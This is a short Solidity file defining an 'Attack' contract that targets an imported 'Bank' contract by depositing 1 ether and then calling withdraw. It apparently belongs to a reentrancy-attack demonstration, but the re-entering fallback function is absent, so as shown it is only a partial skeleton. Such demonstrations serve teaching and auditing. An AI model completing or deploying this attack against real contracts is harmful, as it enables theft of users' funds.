// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Bank.sol";

contract Attack {
    Bank public bank;

    constructor (address _bank) {
        bank = Bank(_bank);
    }

    

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}